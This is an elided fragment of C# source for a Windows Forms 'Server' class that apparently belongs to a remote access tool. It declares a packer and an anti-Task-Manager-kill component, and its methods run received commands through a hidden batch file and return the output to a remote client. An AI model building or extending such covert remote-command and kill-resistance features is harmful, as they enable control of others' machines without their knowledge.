...
namespace Server
{
    public partial class FrmMain : Form
    {
        ...
        private readonly Pack Packer = new Pack();
        ...
        readonly AntiTaskManagerKill antiKill = new AntiTaskManagerKill("Server");
        ...
        private void RunCMD(string Command, ServerClient Client)
        {
            ...
            ProcessStartInfo oStartInfo = new ProcessStartInfo(AppPath + @"\temp.bat") { UseShellExecute = false, RedirectStandardOutput = true, RedirectStandardError = true, CreateNoWindow = true };
        ...
        private void ExecuteCommand(string Command, ServerClient Client)
        {
            ...
            string cmd = ndx < 0 ? Command : Command.Substring(0, ndx);
